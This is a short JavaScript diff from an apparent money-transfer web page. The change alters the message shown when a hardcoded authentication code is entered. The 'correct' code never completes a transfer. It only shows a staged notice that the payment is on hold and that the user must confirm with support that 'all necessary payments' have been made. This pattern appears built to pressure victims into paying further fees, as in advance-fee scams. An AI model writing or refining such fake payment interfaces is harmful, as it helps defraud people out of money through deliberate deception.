@@ -168,7 +168,7 @@
                 const authCode = document.getElementById('auth-code').value;
 
                 if (authCode === '669927') {
-                    authError.textContent = 'Transfer initiation failed. Please contact support.'; // Same error styling
+                    authError.textContent = 'The payment is currently on hold. Please confirm with the support team to ensure all necessary payments has been made, and then try again.'; // Same error styling
                     authError.classList.remove('hidden'); // Show the error
                 } else {
                     authError.textContent = 'Invalid authentication code!';
